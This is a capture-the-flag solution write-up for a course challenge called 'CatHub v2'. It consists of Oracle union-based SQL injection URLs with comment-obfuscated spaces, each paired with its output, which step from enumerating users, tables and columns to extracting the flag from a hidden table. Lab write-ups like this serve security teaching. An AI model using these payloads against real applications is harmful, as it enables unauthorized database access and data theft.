# CatHub v2 solution step by step

## finished
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,user,null/**/from/**/dual/**/where/**/rownum/**/=/**/1` --> SCOTT
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,SYS.DATABASE_NAME,null/**/from/**/dual` --> XE
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES` --> XDB (DB_NAME_META)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES/**/where/**/rownum=1` --> SYS (DB_NAME)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/ALL_TABLES` --> AUDIT_ACTIONS (TABLE_NAME_META)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/ALL_TAB_COLUMNS` --> ABORT_STEP (COLUMN_NAME_META)
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/ALL_TAB_COLUMNS/**/where/**/rownum=1` --> DUMMY (COLUMN)   
`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,DUMMY,null/**/from/**/sys.dual/**/where/**/rownum=1` --> ERROR  


## currently working on 

`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/USER_TABLES` --> BONUS

`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,user,null/**/from/**/USER_TABLES` --> BONUS

`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/(SELECT/**/ROWNUM/**/r,/**/TABLE_NAME FROM/**/user_tables/**/ORDER/**/BY/**/TABLE_NAME)/**/WHERE/**/r=1`--> DEPT


`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,COLUMN_NAME,null/**/from/**/USER_TAB_COLUMNS` --> COMM




## Work part

`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/user_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=6` --> WORK!!!! S3CRET!

`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/user_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r=19` --> WORK!!!! V3RY_S3CRET_C0LUMN!

`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,V3RY_S3CRET_C0LUMN,null/**/from/**/S3CRET` --> FLAG{HEY___OR@CLE_D4TAB4S3__INJ3CTI0N_I5____TO0OOO0OOO0OO_E4SY!!!!!??}